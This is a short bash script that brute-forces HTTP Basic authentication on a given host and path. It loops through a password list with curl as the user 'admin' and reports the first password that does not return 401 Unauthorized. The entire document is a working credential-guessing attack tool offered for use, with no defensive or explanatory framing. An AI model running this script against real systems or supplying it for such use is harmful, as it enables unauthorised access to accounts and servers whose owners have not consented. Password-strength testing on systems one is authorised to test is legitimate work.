#!/bin/bash
# Bruteforce for HTTP Basic authentification using curl and a password list
# Default user set as "admin"

if [ "${#@}" != "3" ]; then
  echo "<command> <host> <path> <password_list>"
  exit
fi

ip=$1
path=$2
pass_file=$3


SECONDS=0

for pass in $(cat ${pass_file}); do
  res="$(curl -si admin:${pass}@${ip}${path} | grep "HTTP/1.1 401 Unauthorized")"
if [ "$res" == '' ]; then
  echo "admin:${pass}"
  tput setaf 2
  duration=$SECONDS
  echo "[SUCCESS] in $(($duration % 60)) seconds."
  tput sgr0
  exit
fi
  done;
echo "No password found !"
